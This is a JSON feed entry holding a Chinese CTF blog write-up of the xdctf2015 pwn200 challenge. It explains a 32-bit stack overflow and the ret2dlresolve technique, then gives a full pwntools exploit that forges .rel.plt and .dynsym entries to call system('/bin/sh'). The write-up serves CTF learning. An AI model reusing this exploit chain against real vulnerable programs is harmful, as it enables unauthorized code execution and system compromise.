{
    "version": "https://jsonfeed.org/version/1",
    "title": "此时相望不相闻，愿逐月华流照君 • All posts by \"ret2dlresolve\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/10/27/pwn/%E5%88%B7%E9%A2%98/BUUCTF/xdctf2015_pwn200(ret2dlresolve)/",
            "url": "https://vvwwvv.cn/2023/10/27/pwn/%E5%88%B7%E9%A2%98/BUUCTF/xdctf2015_pwn200(ret2dlresolve)/",
            "title": "xdctf2015_pwn200（栈溢出,ret2dlresolve）",
            "date_published": "2023-10-27T13:23:15.000Z",
            "content_html": "<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p>32 位程序，开启了 NX</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/LSR%40FXGRY%24N4%7EH_JN%29RG%28%243.png\" alt=\"\" /></p>\n<p>ida32 查看</p>\n<p><code>main:</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/6JD%7DND%29O8V%5BD1HTD%25BF0%60EE.png\" alt=\"\" /></p>\n<p><code>vuln:</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/VOOQ%40L376XH%5DLJTT3R4%25YTW.png\" alt=\"\" /></p>\n<h1 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h1>\n<p>可以发现 read 读入的字节数可以导致栈溢出，但是没有后门函数，我们可以进行泄露 libc 来 getshell，但是这里换一个方法，通过利用 <code>ret2dlresolve</code>  来解决， <code>ret2dlresolve</code>  通常利用在无法泄露出地址时，通过让 <code>dl_runtime_reslove</code>  函数来解析函数名达到执行动态链接库函数的目的</p>\n<p>因为 <code>dl_runtime_resolve</code>  函数没有检查边界，所以我们可以将其对应的结构体写入其他地址，然后通过一定 <code>偏移</code> 大小来使 <code>dl_runtime_resolve</code>  去执行</p>\n<h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理：</h2>\n<p><code>_dl_runtime_resolve(link_map_obj,reloc_index)</code>  将该函数执行方式分开看如下图所示：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/V%60%28342LD_94ZQ%7BI%5DN%5DV%5B%7EWA.png\" alt=\"\" /></p>\n<p>调试查看该函数的调用过程：</p>\n<p>利用命令 <code>objdump -d bof</code> , 得到函数的地址：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/ATIVF68HN9E1FNVNL9I3Y42.png\" alt=\"\" /></p>\n<p>在 gdb 中下断点调试：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/%7E8%5BM1FG%7D%7BMUU%7DX%7BFPDSSELT.png\" alt=\"\" /></p>\n<p>从上面的图中也能发现，3 个 jmp 里有两个 push，这里分别对应了 <code>dl_runtime_resolve函数</code> 的两个参数 ( <code>push 0x20 对应 reloc_indxe</code> ， <code>push 0x804a004 对应 link_map_obj</code> )</p>\n<p>这里我们就需要修改 <code>reloc_index</code>  的值来去寻找到我们伪造的结构体 <code>.rel.plt</code> （这里的 <code>reloc_index</code>  的值实际上也就是偏移量，能够改写该偏移量，那么后续的结构体只要伪造好了就可以按照我们想要的执行）</p>\n<p>对于参数 <code>obj_link_map</code>  我们不需要修改，这个地址后续划分的三个基地址可以被使用，所以我们通过栈溢出将 plt [0] 的地址覆盖 ret, 后面只要加入参数 <code>reloc_index</code>  即可</p>\n<p>仍然是通过这张图来看拆分的结构：<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/V%60%28342LD_94ZQ%7BI%5DN%5DV%5B%7EWA.png\" alt=\"\" /></p>\n<p>我们后续就是需要伪造 <code>.rel.plt</code> 、 <code>.dynsym</code>  这两个结构体，其结构分别为：</p>\n<p>.rel.plt 结构体：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  Elf32_Addr r_offset<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  Elf32_Word r_info<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span>Elf32_Rel</pre></td></tr></table></figure><p>dynsym 结构体：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  Elf32_Word    st_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 符号名，是相对.dynstr 起始的偏移</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  Elf32_Addr    st_value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  Elf32_Word    st_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> st_info<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 对于导入函数符号而言，它是 0x12</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> st_other<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  Elf32_Section st_shndx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span>Elf32_Sym<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 对于导入函数符号而言，除 st_name 外其他字段都是 0</span></pre></td></tr></table></figure><p>除此之外还需要构造一个如 <code>system\\x00</code>  的字符串作为 <code>函数名去解析</code></p>\n<p>在我们伪造的结构体中，我们可以控制其成员变量，也就意味着能够构造偏移，使得 <code>dl_runtime_resolve</code>  可以一步一步达到我们需要解析的函数名处</p>\n<p>构造方式 (这里反着构造)：</p>\n<ol>\n<li>部署字符串（要执行的函数名，如 <code>system\\x00</code> ）</li>\n<li>通过 <code>字符串地址-dynstr基地址</code>  得到 dynsym 结构体中第一个成员变量的值（也就是字符串的偏移）</li>\n<li>部署伪造的 system 的 <code>.dynsym</code>  结构体，其中第一个成员变量要用 <code>步骤2</code>  的值</li>\n<li>由伪造的 <code>system</code>  结构体地址 - dynsym 基地址 = 偏移，利用该偏移得到 <code>r_info</code>  ((偏移 / 0x10&lt;&lt;8)+0x7)</li>\n<li>伪造 <code>rel.plt</code>  结构体，通过上面的 <code>r_info</code>  作为其第二个成员变量（第一个成员变量为 <code>write_got</code>  等）</li>\n<li>利用伪造的 <code>rel.plt</code>  结构体地址 - rel.plt 基地址 = <code>reloc_index</code> ，得到的 <code>reloc_index</code>  就是 <code>dl_runtime_resolve</code>  第二个参数，第一个参数是 <code>link_map_obj</code>  在前面利用 <code>plt0</code>  覆盖 ret 后就直接 push 进栈了</li>\n</ol>\n<h1 id=\"3构造exp\"><a class=\"anchor\" href=\"#3构造exp\">#</a> 3. 构造 exp</h1>\n<p>因为我们需要将伪造的几个结构体写入固定的地址，这里写入 bss 段内</p>\n<p>接下来就是利用 read 函数将伪造的结构体内容写入到 bss 段上，这里需要记录下每个结构体在 bss 段的地址，方便我们后续的偏移量的写入</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'bof'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./bof'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span><span class=\"token string\">'./bof'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">112</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>bss_addr <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取 bss 段首地址</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>write_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#获取 plt0 的基地址</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>plt0 <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>get_section_by_name<span class=\"token punctuation\">(</span><span class=\"token string\">'.plt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">.</span>sh_addr</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#获取.rel.plt 的基地址</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rel_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>get_section_by_name<span class=\"token punctuation\">(</span><span class=\"token string\">'.rel.plt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">.</span>sh_addr</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#获取.dynsym 的基地址</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>dynsym <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>get_section_by_name<span class=\"token punctuation\">(</span><span class=\"token string\">'.dynsym'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">.</span>sh_addr</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#获取.dynstr 的基地址</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>dynstr <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>get_section_by_name<span class=\"token punctuation\">(</span><span class=\"token string\">'.dynstr'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">.</span>sh_addr</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Welcome to XDCTF2015~!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">## 将栈迁移到 bss 段</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">## 新栈空间大小为 0x800</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>stack_size <span class=\"token operator\">=</span> <span class=\"token number\">0x800</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>base_stage <span class=\"token operator\">=</span> bss_addr <span class=\"token operator\">+</span> stack_size </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">### 填充缓冲区</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> offset<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">### 向新栈中写 100 个字节</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">##rop.read 会自动完成 read 函数、函数参数、返回地址的栈部署</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>rop<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> base_stage<span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">### 栈迁移，设置 esp = base_stage</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">##rop.migrate 会利用 leave_ret 自动部署迁移工作</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rop<span class=\"token punctuation\">.</span>migrate<span class=\"token punctuation\">(</span>base_stage<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># \"/bin/sh\" 字符串</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span><span class=\"token string\">'./bof'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sh <span class=\"token operator\">=</span> <span class=\"token string\">b\"/bin/sh\\x00\"</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">## 在 base_stage + 32 的地方开始部署.dynsym 结构体</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>fake_sym_addr <span class=\"token operator\">=</span> base_stage <span class=\"token operator\">+</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">## 对齐</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>align <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fake_sym_addr <span class=\"token operator\">-</span> dynsym<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>fake_sym_addr <span class=\"token operator\">=</span> fake_sym_addr <span class=\"token operator\">+</span> align</pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">## 计算.dynsym 结构体下标</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>index_dynsym <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fake_sym_addr <span class=\"token operator\">-</span> dynsym<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">## 计算.dynstr 偏移准备更改.dynsym 成员变量 st_name</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>st_name <span class=\"token operator\">=</span> fake_sym_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> dynstr</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>fake_write_sym <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>st_name<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 伪造的.dynsym 结构体</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># 在 base_stage+24 的位置开始部署.rel.plt 的结构体</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>index_offset <span class=\"token operator\">=</span> base_stage <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">-</span> rel_plt</pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># 由.dynsym 结构体下标反推 r_info</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>r_info <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>index_dynsym <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token number\">0x7</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>fake_write_reloc <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>write_got<span class=\"token punctuation\">,</span> r_info<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>plt0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>index_offset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># fake ret addr of write</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#system 函数返回地址</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>base_stage <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#system 函数 1 参</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#原 write 函数 2 参</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#原 write 函数 3 参</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>fake_write_reloc<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 伪造的.rel.plt 的结构体</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> align<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 对齐</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>fake_write_sym<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 伪造的.dynsym 的结构体</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'system\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#伪造的.dynstr</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">80</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\">#rop.raw('a' * (100 - len(rop.chain())))</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#可打印栈布局</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/MHSA%29%28XD%29%7E8DXO9%254%600%25G%5BR.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        }
    ]
}